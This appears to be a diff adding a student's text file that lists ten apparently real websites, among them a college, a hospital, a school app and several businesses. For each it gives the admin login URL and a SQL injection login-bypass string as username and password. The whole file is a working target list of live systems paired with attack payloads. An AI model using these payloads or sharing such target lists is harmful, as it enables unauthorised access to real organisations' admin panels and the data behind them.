@@ -1,0 +1,50 @@
+
+
+*****Student ID: D703R*****
+
+
+
+
+
+1.Site: http://www.bils.co.in
+  Admin Panel: http://www.bils.co.in/Login.asp
+  U/P: '="or'
+
+
+2.Site: http://www.maldacollege.ac.in
+  Admin Panel: http://www.maldacollege.ac.in/faculty-login2.php
+  U/P: '="or'
+
+
+3. Site: http://www.technopk.com
+   Admin Panel: http://www.technopk.com/login.php
+   U/P: '="or'
+
+
+4.Site: http://mlaapp.com
+  Admin Panel: http://mlaapp.com/schooladmin/login.php
+  U/P: '="or'
+
+5. Site: https://www.dartstoc.com
+   Admin Panel: https://www.dartstoc.com/Admin4/AdminLogin.aspx
+   U/P: '="or'
+
+6. Site: http://alltimecargo.com
+   Admin Panel: http://alltimecargo.com/login.php
+   U/P: '="or'
+
+7. Site: http://www.dxfcreator.com
+   Admin Panel: http://www.dxfcreator.com/adminlogin.aspx
+   U/P: '="or'
+
+8. Site: https://bexhospital.com
+   Admin Panel: https://bexhospital.com/admin.php
+   U/P: ' or ''='
+
+9. Site: http://www.latursahodaya.com
+   Admin Panel: http://www.latursahodaya.com/login.php
+   U/P: ' or ''='
+
+10. Site: http://www.roadsidetransport.com
+    Admin Panel: http://www.roadsidetransport.com/admin-login.asp?msg=uu
+    U/P: '="or'
